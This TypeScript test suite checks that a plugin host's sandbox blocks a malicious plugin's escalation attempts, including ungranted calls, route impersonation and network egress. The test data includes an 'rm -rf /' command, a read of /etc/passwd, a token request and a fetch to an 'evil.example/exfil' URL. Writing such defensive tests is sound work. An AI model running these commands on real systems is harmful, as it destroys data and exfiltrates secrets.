// Adversarial security suite for the third-party plugin host (WF3). These are the
// SECURITY VERIFICATION for the capability sandbox, not incidental coverage.
//
// They run over a REAL Bun `MessageChannel` (mirroring `bridge.integration.test.ts`)
// plus DOM-free assertions over the pure predicates/constants the host extracts,
// so every one of the design's adversarial cases has a home without a webview:
//   - a BENIGN fixture registers its own route and calls its one granted capability;
//   - a MALICIOUS fixture attempts every escalation and each is BLOCKED host-side.

import { describe, expect, it } from "bun:test";
import { IFRAME_SANDBOX } from "./ExtensionHost.tsx";
import {
	asRpcRequest,
	type Capability,
	capabilitiesFromGrants,
	dispatchRpc,
	type HostServices,
	isShellSafeRoute,
	type RouteClaim,
	type RpcResponse,
	validatePluginRoute,
} from "./rpc.ts";
import { thirdPartyPluginSrcdoc } from "./third-party-plugin.ts";

const AGENTS = [{ id: "ryu", name: "Ryu" }];
const NOT_GRANTED = /Capability not granted/;
const UNKNOWN = /Unknown method/;
const NOT_OWN_SURFACE = /not this plugin's own surface/;

const PLUGIN_ID = "app__demo-panel";
const OWN_ROUTE = `/plugin/${encodeURIComponent(PLUGIN_ID)}`;

// The host services a real PluginHostPanel would build for `PLUGIN_ID`: a minimal
// `{id,name}` projection for listAgents, and a pluginId-scoped registerRoute that
// only accepts this plugin's own surface. It exposes NO token/secret accessor.
function hostServices(): HostServices {
	return {
		listAgents: () =>
			Promise.resolve(AGENTS.map((a) => ({ id: a.id, name: a.name }))),
		registerRoute: (claim: RouteClaim) =>
			validatePluginRoute(PLUGIN_ID, claim)
				? Promise.resolve({ path: claim.path })
				: Promise.reject(
						new Error(`route '${claim.path}' is not this plugin's own surface`)
					),
	};
}

/** Attach the host's port handler (mirrors ExtensionHost.onPortMessage). */
function attachHost(
	port: MessagePort,
	granted: ReadonlySet<Capability>,
	svc: HostServices
): void {
	port.onmessage = (event: MessageEvent) => {
		const req = asRpcRequest(event.data);
		if (!req) {
			return;
		}
		dispatchRpc(req.method, req.args, granted, svc)
			.then((result) => {
				port.postMessage({
					kind: "ryu-plugin-rpc-result",
					id: req.id,
					result,
				} satisfies RpcResponse);
			})
			.catch((err: unknown) => {
				port.postMessage({
					kind: "ryu-plugin-rpc-result",
					id: req.id,
					error: err instanceof Error ? err.message : String(err),
				} satisfies RpcResponse);
			});
	};
	port.start?.();
}

/** A "plugin" caller over the other port that resolves replies by id — the shape
 *  the sandboxed bootstrap's `call()` helper drives. */
function pluginCaller(port: MessagePort) {
	const pending = new Map<
		number,
		{ resolve: (v: unknown) => void; reject: (e: Error) => void }
	>();
	let nextId = 1;
	port.onmessage = (event: MessageEvent) => {
		const msg = event.data as RpcResponse;
		if (msg?.kind !== "ryu-plugin-rpc-result") {
			return;
		}
		const p = pending.get(msg.id);
		if (!p) {
			return;
		}
		pending.delete(msg.id);
		if (typeof msg.error === "string") {
			p.reject(new Error(msg.error));
		} else {
			p.resolve(msg.result);
		}
	};
	port.start?.();
	return (method: string, args: unknown[] = []) =>
		new Promise<unknown>((resolve, reject) => {
			const id = nextId++;
			pending.set(id, { resolve, reject });
			port.postMessage({ kind: "ryu-plugin-rpc", id, method, args });
		});
}

/** Wire a fresh channel with `granted` capabilities and return the plugin caller. */
function connect(granted: ReadonlySet<Capability>) {
	const channel = new MessageChannel();
	attachHost(channel.port1, granted, hostServices());
	const call = pluginCaller(channel.port2);
	return {
		call,
		close: () => {
			channel.port1.close();
			channel.port2.close();
		},
	};
}

// ── Benign fixture: does exactly what a well-behaved plugin does ────────────────

describe("benign third-party plugin over the real bridge", () => {
	it("registers its OWN route and lists agents with the granted capabilities", async () => {
		const { call, close } = connect(
			capabilitiesFromGrants(["ui:render", "core:list_agents"])
		);
		await expect(
			call("ui.registerRoute", [{ path: OWN_ROUTE, title: "Demo Panel" }])
		).resolves.toEqual({ path: OWN_ROUTE });
		await expect(call("core.listAgents")).resolves.toEqual([
			{ id: "ryu", name: "Ryu" },
		]);
		close();
	});
});

// ── Malicious fixture: every escalation must be blocked host-side ───────────────

describe("malicious third-party plugin is blocked at the host gate", () => {
	// ungranted_capability_blocked
	it("rejects a granted method whose capability was NOT approved", async () => {
		// Grants only ui.render → core.listAgents is a known method but ungranted.
		const { call, close } = connect(capabilitiesFromGrants(["ui:render"]));
		await expect(call("core.listAgents")).rejects.toThrow(NOT_GRANTED);
		close();
	});

	// unknown_method_blocked
	it("rejects tool.* / fs.* as UNKNOWN even with every capability granted", async () => {
		const all = new Set<Capability>(["core.listAgents", "ui.render"]);
		const { call, close } = connect(all);
		await expect(call("tool.execute", [{ cmd: "rm -rf /" }])).rejects.toThrow(
			UNKNOWN
		);
		await expect(call("fs.read", ["/etc/passwd"])).rejects.toThrow(UNKNOWN);
		close();
	});

	// secret_reach_blocked
	it("rejects every secret/egress reach as UNKNOWN, and exposes no token accessor", async () => {
		const all = new Set<Capability>(["core.listAgents", "ui.render"]);
		const { call, close } = connect(all);
		await expect(call("core.getToken")).rejects.toThrow(UNKNOWN);
		await expect(
			call("gateway.rawFetch", ["https://evil.example/exfil"])
		).rejects.toThrow(UNKNOWN);
		await expect(call("identity.read", ["openai"])).rejects.toThrow(UNKNOWN);
		close();

		// The `services` object handed to the host exposes ONLY listAgents +
		// registerRoute — no token/secret/key accessor.
		const svc = hostServices();
		expect(Object.keys(svc).sort()).toEqual(["listAgents", "registerRoute"]);
		// listAgents returns only {id,name} — never a raw agent record.
		const agents = (await svc.listAgents()) as Record<string, unknown>[];
		for (const a of agents) {
			expect(Object.keys(a).sort()).toEqual(["id", "name"]);
		}
	});

	// system_route_impersonation_rejected
	it("rejects claims to system routes and other plugins' routes", async () => {
		const { call, close } = connect(capabilitiesFromGrants(["ui:render"]));
		await expect(
			call("ui.registerRoute", [{ path: "/agents", title: "Agents" }])
		).rejects.toThrow(NOT_OWN_SURFACE);
		await expect(
			call("ui.registerRoute", [{ path: "/settings", title: "Settings" }])
		).rejects.toThrow(NOT_OWN_SURFACE);
		await expect(
			call("ui.registerRoute", [{ path: "/plugin/app__other", title: "Other" }])
		).rejects.toThrow(NOT_OWN_SURFACE);
		close();
	});

	it("rejects an own-path claim whose title impersonates system chrome", async () => {
		const { call, close } = connect(capabilitiesFromGrants(["ui:render"]));
		await expect(
			call("ui.registerRoute", [{ path: OWN_ROUTE, title: "Ryu Settings" }])
		).rejects.toThrow(NOT_OWN_SURFACE);
		close();
	});
});

// ── Pure gate: grant→capability mapping is default-deny and validated-only ──────

describe("capabilitiesFromGrants (invariant #3, deny-safe)", () => {
	it("maps only KNOWN grant strings and drops everything else", () => {
		const caps = capabilitiesFromGrants([
			"core:list_agents",
			"ui:render",
			"fs:read", // unmapped → dropped
			"identity:read", // unmapped → dropped
		]);
		expect([...caps].sort()).toEqual(["core.listAgents", "ui.render"]);
	});

	it("yields an EMPTY (deny-all) set for no/failed grants", () => {
		expect(capabilitiesFromGrants([]).size).toBe(0);
		// A plugin that only declared unmapped/unapproved grants gets nothing.
		expect(capabilitiesFromGrants(["tool:execute", "gateway:raw"]).size).toBe(
			0
		);
	});
});

// ── validatePluginRoute in isolation (anti-phishing) ────────────────────────────

describe("validatePluginRoute anti-phishing gate", () => {
	it("accepts only this plugin's own exact route", () => {
		expect(
			validatePluginRoute(PLUGIN_ID, { path: OWN_ROUTE, title: "Demo" })
		).toBe(true);
	});

	it("rejects system, other-plugin, nested, and impersonating claims", () => {
		expect(
			validatePluginRoute(PLUGIN_ID, { path: "/agents", title: "Demo" })
		).toBe(false);
		expect(
			validatePluginRoute(PLUGIN_ID, {
				path: "/plugin/app__other",
				title: "Demo",
			})
		).toBe(false);
		expect(
			validatePluginRoute(PLUGIN_ID, {
				path: `${OWN_ROUTE}/sub`,
				title: "Demo",
			})
		).toBe(false);
		expect(
			validatePluginRoute(PLUGIN_ID, { path: OWN_ROUTE, title: "System" })
		).toBe(false);
	});
});

// ── isShellSafeRoute in isolation (shell.openTab anti-phishing allowlist) ────────

describe("isShellSafeRoute allowlist gate", () => {
	it("allows an allowlisted prefix (exact and child) and the plugin's own surface", () => {
		expect(isShellSafeRoute("/chat", OWN_ROUTE)).toBe(true);
		expect(isShellSafeRoute("/settings/quests", OWN_ROUTE)).toBe(true);
		expect(isShellSafeRoute("/spaces/s1/doc/d1", OWN_ROUTE)).toBe(true);
		expect(isShellSafeRoute(OWN_ROUTE, OWN_ROUTE)).toBe(true);
		expect(isShellSafeRoute(`${OWN_ROUTE}/sub`, OWN_ROUTE)).toBe(true);
	});

	it("rejects prefix-collisions, other plugins, non-allowlisted, and malformed paths", () => {
		// A prefix collision must NOT slip past the `${prefix}/` child guard.
		expect(isShellSafeRoute("/chatfoo", OWN_ROUTE)).toBe(false);
		// Only THIS plugin's own surface is passed, so another plugin's is denied.
		expect(isShellSafeRoute("/plugin/app__other", OWN_ROUTE)).toBe(false);
		// A real but non-allowlisted shell route (no arbitrary deep-linking).
		expect(isShellSafeRoute("/agents", OWN_ROUTE)).toBe(false);
		expect(isShellSafeRoute("/", OWN_ROUTE)).toBe(false);
		// Relative / non-absolute / non-string are all rejected.
		expect(isShellSafeRoute("chat", OWN_ROUTE)).toBe(false);
		expect(isShellSafeRoute("", OWN_ROUTE)).toBe(false);
	});
});

// ── sandbox_never_same_origin ───────────────────────────────────────────────────

describe("the sandbox is never same-origin", () => {
	it("IFRAME_SANDBOX is allow-scripts only", () => {
		expect(IFRAME_SANDBOX).toBe("allow-scripts");
		expect(IFRAME_SANDBOX).not.toContain("allow-same-origin");
	});
});

// ── ungoverned_egress_blocked (invariant #5) ────────────────────────────────────

describe("the plugin document forbids network egress via CSP", () => {
	const srcdoc = thirdPartyPluginSrcdoc(
		"nonce-1",
		btoa("/* code */"),
		"app__demo"
	);

	it("denies all network with connect-src 'none'", () => {
		expect(srcdoc).toContain("Content-Security-Policy");
		expect(srcdoc).toContain("connect-src 'none'");
		// default-src 'none' + no remote script origin => no remote code loading.
		expect(srcdoc).toContain("default-src 'none'");
	});

	it("keeps script-src coherent with the new Function() bootstrap", () => {
		// The bootstrap runs the bundle via new Function(), which CSP gates under
		// 'unsafe-eval'. It MUST be present or every plugin throws a CSP violation
		// at runtime (a failure DOM-free tests cannot observe). Safe because
		// connect-src 'none' still blocks fetching a remote payload to eval.
		expect(srcdoc).toContain("'unsafe-eval'");
	});

	it("never opens egress to a remote origin", () => {
		expect(srcdoc).not.toContain("connect-src https:");
		expect(srcdoc).not.toContain("connect-src *");
	});
});
